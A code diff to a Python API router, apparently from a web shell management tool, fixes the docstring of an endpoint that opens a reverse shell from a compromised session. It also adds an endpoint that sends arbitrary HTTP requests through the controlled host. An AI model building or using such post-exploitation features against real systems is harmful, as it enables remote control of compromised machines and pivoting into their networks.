@@ -352,10 +352,49 @@ async def session_open_reverse_shell(
     host: str = Body(),
     port: int = Body(),
 ):
-    """eval对应代码"""
+    """打开反弹shell"""
     session: SessionInterface = session_manager.get_session_by_id(session_id)
     await session.open_reverse_shell(host, port)
     return {"code": 0, "data": True}
+
+
+class SendHttpRequestRequest(BaseModel):
+    url: str
+    method: str = "GET"
+    headers: t.Union[t.Dict[str, str], None] = None
+    params: t.Union[t.Dict[str, t.Any], None] = None
+    data: t.Union[str, None] = None
+    data_b64: t.Union[str, None] = None
+
+
+@router.post("/session/{session_id}/send_http_request")
+@catch_user_error
+async def session_send_http_request(
+    session_id: UUID,
+    req: SendHttpRequestRequest,
+):
+    """通过受控端发送HTTP请求"""
+    session: SessionInterface = session_manager.get_session_by_id(session_id)
+    data: t.Union[str, bytes, None] = None
+    if req.data_b64 is not None:
+        data = base64.b64decode(req.data_b64)
+    elif req.data is not None:
+        data = req.data
+    result = await session.send_http_request(
+        url=req.url,
+        method=req.method,
+        headers=req.headers,
+        params=req.params,
+        data=data,
+    )
+    return {
+        "code": 0,
+        "data": {
+            "status_code": result["status_code"],
+            "headers": result["headers"],
+            "body": base64.b64encode(result["body"]).decode(),
+        },
+    }
 
 
 @router.get("/session/{session_id}/deploy_vessel")
